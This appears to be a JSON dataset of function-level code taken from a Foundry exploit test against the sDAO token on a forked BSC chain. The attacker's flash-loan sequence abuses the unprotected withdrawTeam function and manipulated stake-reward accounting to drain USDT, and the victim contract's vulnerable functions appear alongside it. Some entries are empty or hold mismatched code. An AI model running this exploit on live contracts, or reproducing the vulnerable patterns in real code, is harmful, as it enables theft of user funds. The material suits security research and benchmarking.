[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        USDTToSDAO();\n        addUSDTsDAOLiquidity();\n        SDAO.stakeLP(Pair.balanceOf(address(this)) / 2);\n        // SDAO.transfer(address(Pair), SDAO.balanceOf(address(this)));\n        SDAO.transferFrom(address(this), address(Pair), SDAO.balanceOf(address(this))); // change totalStakeReward > lastTotalStakeReward\n        SDAO.withdrawTeam(address(Pair));\n        Pair.transfer(address(SDAO), 13 * 1e15);\n        // uint total = SDAO.totalStakeReward();\n        // uint lasttotal =SDAO.lastTotalStakeReward();\n        // uint stake = SDAO.userLPStakeAmount(address(this));\n        // uint paid = SDAO.userRewardPerTokenPaid(address(this));\n        // uint reward = SDAO.getPerTokenReward();\n        // uint pending = SDAO.pendingToken(address(this));\n        SDAO.getReward();\n        SDAOToUSDT();\n        USDT.transfer(dodo, 500 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23_241_440);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        USDT.approve(address(Router), type(uint256).max);\n        SDAO.approve(address(Router), type(uint256).max);\n        Pair.approve(address(Router), type(uint256).max);\n        Pair.approve(address(SDAO), type(uint256).max);\n        SDAO.approve(address(this), type(uint256).max);\n        DVM(dodo).flashLoan(0, 500 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public pure virtual returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "getPerTokenReward",
    "original_code": "    function getPerTokenReward() public view returns(uint) {\n        if ( LPInstance.balanceOf(address(this)) == 0) {\n            return 0;\n        }\n\n        uint newPerTokenReward = (totalStakeReward - lastTotalStakeReward) * 1e18 / LPInstance.balanceOf(address(this));\n        return PerTokenRewardLast + newPerTokenReward;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "getReward",
    "original_code": "    function getReward() public updateReward(msg.sender) {\n        uint _reward = pendingToken(_msgSender());\n        require(_reward > 0, \"sDAOLP stake Reward is 0\");\n        userRewards[_msgSender()] = 0;\n        if (_reward > 0) {\n            _standardTransfer(address(this), _msgSender(), _reward);\n            return ;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "lastTotalStakeReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "pendingToken",
    "original_code": "    function pendingToken(address account) public view returns(uint) {\n        return\n        userLPStakeAmount[account]\n            * (getPerTokenReward() - userRewardPerTokenPaid[account]) \n            / (1e18)\n            + (userRewards[account]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "stakeLP",
    "original_code": "    function stakeLP(uint _lpAmount) external updateReward(msg.sender) {\n        require(_lpAmount >= 1e18, \"LP stake must more than 1\");\n        LPInstance.transferFrom(_msgSender(), address(this), _lpAmount);\n        userLPStakeAmount[_msgSender()] += _lpAmount;\n     }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "totalStakeReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n}\n\n",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "userLPStakeAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "userRewardPerTokenPaid",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "sDAO",
    "source_type": "victim_contract",
    "function_name": "withdrawTeam",
    "original_code": "    function withdrawTeam(address _token) external {\n        IERC20(_token).transfer(TEAM, IERC20(_token).balanceOf(address(this)));\n        payable(TEAM).transfer(address(this).balance);\n    }\n\n",
    "description": ""
  }
]